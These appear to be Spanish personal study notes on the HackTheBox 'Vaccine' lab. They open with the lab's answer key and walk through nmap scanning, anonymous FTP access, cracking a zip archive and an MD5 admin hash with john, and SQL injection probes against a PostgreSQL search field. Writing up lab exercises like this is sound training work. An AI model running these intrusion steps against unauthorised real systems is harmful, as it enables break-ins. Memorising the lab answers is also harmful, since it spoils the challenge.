1)Además de SSH y HTTP, ¿qué otro servicio está alojado en esta caja?
	ftp

2)Este servicio puede configurarse para permitir el inicio de sesión con cualquier contraseña para un nombre de usuario específico. ¿Cuál es ese nombre de usuario?
	anonymous

3)¿Cuál es el nombre del archivo descargado a través de este servicio?
	backup.zip

4)¿Qué script viene con el conjunto de herramientas John The Ripper y genera un hash a partir de un archivo zip protegido por contraseña en un formato que permite intentos de crackeo?
	zip2john

5)¿Cuál es la contraseña del usuario administrador del sitio web?
	qwerty789

6)¿Qué opción se puede pasar a sqlmap para intentar obtener la ejecución de comandos a través de la inyección sql?
	--os-shell

7)¿Qué programa puede ejecutar el usuario postgres como root usando sudo?
	

-----
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.129.163.23
nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.129.163.23 -oG allPorts
extractPorts allPorts
nmap -sCV -p21,22,80 10.129.163.23 -oN target
```

![[Vaccine4.png]]

![[Vaccine1.png]]

![[Vaccine2.png]]

![[Vaccine3.png]]
*TTL:* Linux
*Puertos:*
`21`FTP | Vulnerabilidad con usuario anonymous
`22`SSH
`80`Apache/HTTP

--------
# [[Enumeracion con pequeño script de NMAP y Whatweb-wappalyzer]]

![[Vaccine5.png]]
No da ninguna informacion relevante

----------------
# Pagina web

![[Vaccine11.png]]

----
# Ingreso a [[ftp]] con usuario anonymous

`ftp 10.129.163.23 -p 21`
Entramos al servicio de ftp y descargamos el unico archivo con `get` que se llama backup.zip
![[Vaccine6.png]]

-------
# Sacamos el hash del archivo zip con [[zip2john]] y crackeamos contraseña con [[john]]

Intentamos descomprimir el archivo [[unzip]] `unzip backup.zip`
![[Vaccine7.png]]
Tiene contraseña asi que no lo podemos descomprimir. Usamos [[zip2john]] para sacarle el hash al archivo y luego con [[john]] crackeamos la contraseña

```shell
zip2john backup.zip > hash
john -w=/usr/share/wordlists/rockyou.txt hash
```

![[Vaccine8.png]]
 Nos da que la contraseña del backup.zip es ``741852963``
 
Ahora descomprimimos y buscamos en los archivos que nos da si tiene algun tipo de contraseña para logearnos al panel de la web
Con [[unzip]] ``unzip backup.zip`` descomprimimos y con [[cat]][[grep]] `cat index.php | grep -i password` buscamos en los archivos si tenia contraseñas
![[Vaccine9.png]]
Nos dice que el usuario es admin y la contraseña esta en md5 2cb42f8734ea607eefed3b70af13bbd3

#### Crackeamos la contraseña que esta en md5 con [[john]]
``john -w=/usr/share/wordlists/rockyou.txt --format=raw-md5 md5 ``            | IMPORTANTE USAR el parametro de --format por que si no no crackea la contraseña
![[Vaccine10.png]]
Contraseña: ``qwerty789``
Ponemos los datos de logeo y ya estamos adentro

-------
# SQL

Al poner una ' en la parte de search nos aparece este error

![[Vaccine12.png]]
Por esto que dice `ilike` sabemos que es [[postgresql]] ya que es un error caracteristico de esta base de datos
Pero si probamos con otra inyeccion por ejemplo ``' or 1=1-- -``  ``o ' or 1=2-- -`` no nos aparece nada



En el writeup usa sqlmap que no lo quiero usar y tengo que buscar de que forma manual lo vulneramos
PONER EN CARPETAS LO DE COMPRIMIDORES DE ARCHIVOS Y MODIFICAR LO DE UNZIP
HACER APUNTES DE ZIP2JOHN
AGREGAR A APUNTES DE JOHN --format=raw-md5 md5






-------
# Creditos
Writeup Oficial HackTheBox